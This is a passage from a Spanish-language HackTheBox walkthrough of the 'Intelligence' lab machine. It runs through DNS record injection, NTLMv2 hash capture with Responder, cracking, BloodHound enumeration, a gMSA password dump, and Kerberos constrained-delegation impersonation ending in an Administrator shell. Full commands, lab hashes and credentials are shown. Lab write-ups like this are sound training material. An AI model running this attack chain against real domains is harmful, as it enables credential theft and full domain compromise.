```

- Podemos robar un hash con esta herramienta para inyectar un record <https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py>.

```bash
❯ python3 dnstool.py
usage: dnstool.py [-h] [-u USERNAME] [-p PASSWORD] [--forest] [--legacy] [--zone ZONE] [--print-zones] [--tcp] [-k]
                  [-port port] [-force-ssl] [-dc-ip ip address] [-dns-ip ip address] [-aesKey hex key] [-r TARGETRECORD]
                  [-a {add,modify,query,remove,resurrect,ldapdelete}] [-t {A}] [-d RECORDDATA] [--allow-multiple] [--ttl TTL]
                  HOSTNAME
dnstool.py: error: the following arguments are required: HOSTNAME
```

- Vamos a poner que el nombre que comienza con web para que todo funcione.

```bash
❯ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webmiguel -a add -t A -d 10.10.14.30 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- Vamos a capturar el trafico como ya se inyecto el DNS record y se ejecute el script la autenticación ira hacia nosotros y vamos a ver el hash del usuario.


```bash
❯ sudo responder -I tun0
```

- Después de unos minutos nos llega el hash.

```bash
❯ sudo responder -I tun0
[sudo] password for miguelrega7: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.30]
    Responder IPv6             [dead:beef:2::101c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-Z9A9SBGSGZR]
    Responder Domain Name      [1RV7.LOCAL]
    Responder DCE-RPC Port     [45229]

[+] Listening for events...

               
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

- Vemos la contraseña.

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                
❯ john --show hash.txt
Ted.Graves:Mr.Teddy:intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

1 password hash cracked, 0 left
                                                                                         
```

- Las credenciales son correctas.

```bash
❯ crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

- Vamos a usar `bloodhound` para enumerar el dominio y ver vías de escalar privilegios y obtener una shell.

```bash
❯ bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 29S
```

```bash
❯ sudo neo4j console
```

- Una vez hacemos todo el proceso de neo4j ejecutamos el `bloodhound`.

```bash
❯ bloodhound &> /dev/null &
[1] 96907
```

- Nosotros como el usuario `Ted.Graves` podemos ver la contraseña de `SVC_INT`.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/4.png">
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/5.png">
</p>

- Podemos usar la siguiente herramienta <https://github.com/micahvandeusen/gMSADumper>.

```bash
❯ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::4c395675187a74271de7c4af867ad417
svc_int$:aes256-cts-hmac-sha1-96:cd87c9ddd67ecee7f918e83fc5506eb1cd8f8d114a4c2e763ae0340c949a777c
svc_int$:aes128-cts-hmac-sha1-96:541f7fe57df7994bbf6d0312a8849f94
```

- Tenemos el privilegio de `AllowedToDelegate`.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/6.png">
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/7.png">
</p>

- Podemos usar esta herramienta de `impacket` para el `impersonate`.

```bash
❯ impacket-getST -h
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

usage: getST.py [-h] [-spn SPN] [-altservice ALTSERVICE]
                [-impersonate IMPERSONATE]
                [-additional-ticket ticket.ccache] [-ts]
                [-debug] [-u2u] [-self]
                [-force-forwardable]
                [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                [-aesKey hex key] [-dc-ip ip address]
                identity

Given a password, hash or aesKey, it will request a
Service Ticket and save it as ccache

positional arguments:
  identity              [domain/]username[:password]

options:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the
                        target service the service
                        ticket will be generated for
  -altservice ALTSERVICE
                        New sname/SPN to set in the
                        ticket
  -impersonate IMPERSONATE
                        target username that will be
                        impersonated (thru S4U2Self) for
                        quering the ST. Keep in mind
                        this will only work if the
                        identity provided in this
                        scripts is allowed for
                        delegation to the SPN specified
  -additional-ticket ticket.ccache
                        include a forwardable service
                        ticket in a S4U2Proxy request
                        for RBCD + KCD Kerberos only
  -ts                   Adds timestamp to every logging
                        output
  -debug                Turn DEBUG output ON
  -u2u                  Request User-to-User ticket
  -self                 Only do S4U2self, no S4U2proxy
  -force-forwardable    Force the service ticket
                        obtained through S4U2Self to be
                        forwardable. For best results,
                        the -hashes and -aesKey values
                        for the specified -identity
                        should be provided. This allows
                        impresonation of protected users
                        and bypass of "Kerberos-only"
                        constrained delegation
                        restrictions. See CVE-2020-17049

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is
                        LMHASH:NTHASH
  -no-pass              don't ask for password (useful
                        for -k)
  -k                    Use Kerberos authentication.
                        Grabs credentials from ccache
                        file (KRB5CCNAME) based on
                        target parameters. If valid
                        credentials cannot be found, it
                        will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos
                        Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain
                        controller. If omitted it use
                        the domain part (FQDN) specified
                        in the target parameter
```

- Pero necesitamos el `SPN`.

```bash
❯ pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 --full-data
Password:
objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
cn:                             svc_int
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
instancetype:                   4
whencreated:                    2021-04-19 00:49:58+00:00
whenchanged:                    2024-08-12 04:08:48+00:00
usncreated:                     12846
usnchanged:                     102619
name:                           svc_int
objectguid:                     {f180a079-f326-49b2-84a1-34824208d642}
useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
badpwdcount:                    0
codepage:                       0
countrycode:                    0
badpasswordtime:                2024-08-12 04:08:16.285681+00:00
lastlogoff:                     1601-01-01 00:00:00+00:00
lastlogon:                      2024-08-12 04:08:48.848196+00:00
localpolicyflags:               0
pwdlastset:                     2024-08-12 03:56:15.020052+00:00
primarygroupid:                 515
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
accountexpires:                 9999-12-31 23:59:59.999999+00:00
logoncount:                     1
samaccountname:                 svc_int$
samaccounttype:                 805306369
dnshostname:                    svc_int.intelligence.htb
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:         False
dscorepropagationdata:          1601-01-01 00:00:00+00:00
lastlogontimestamp:             2024-08-12 04:08:48.848196+00:00
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-supportedencryptiontypes:  28
msds-managedpasswordid:         010000004b44534b020000006a010000130000000800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordpreviousid: 010000004b44534b020000006a010000110000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordinterval:   30
msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 

objectclass:                   top, person, organizationalPerson, user, computer
cn:                            DC
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
instancetype:                  4
whencreated:                   2021-04-19 00:42:41+00:00
whenchanged:                   2024-08-11 23:33:15+00:00
displayname:                   DC$
usncreated:                    12293
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb, 
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
usnchanged:                    102437
name:                          DC
objectguid:                    {f28de281-fd79-40c5-a77b-1252b80550ed}
useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
badpwdcount:                   0
codepage:                      0
countrycode:                   0
badpasswordtime:               1601-01-01 00:00:00+00:00
lastlogoff:                    1601-01-01 00:00:00+00:00
lastlogon:                     2024-08-12 00:32:44.441931+00:00
localpolicyflags:              0
pwdlastset:                    2024-08-11 23:32:46.261578+00:00
primarygroupid:                516
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
accountexpires:                9999-12-31 23:59:59.999999+00:00
logoncount:                    323
samaccountname:                DC$
samaccounttype:                805306369
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence.htb, 
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence.htb
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:        True
dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
lastlogontimestamp:            2024-08-11 23:33:15.886587+00:00
msds-supportedencryptiontypes: 28
msds-generationid:             1b056d02cbe351ba...
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
```

- Ahora lo impersonamos al administrador.

- Bueno esto significa que nos tenemos que sincronizar al reloj del DC.

```bash
❯ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

- Ahora nos sincronizamos.

```bash
❯ sudo ntpdate -s 10.10.10.248
```

- Y listo.

```bash
❯ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

- Ahora nos autenticamos con el `ccache` y exportamos la variable de entorno.

```bash
❯ export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

- Ahora nos autenticamos y vemos la flag.

```bash
❯ impacket-wmiexec dc.intelligence.htb -k -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
1b2c72e788bdcc6d73cb1b9175fb420c

C:\>
```
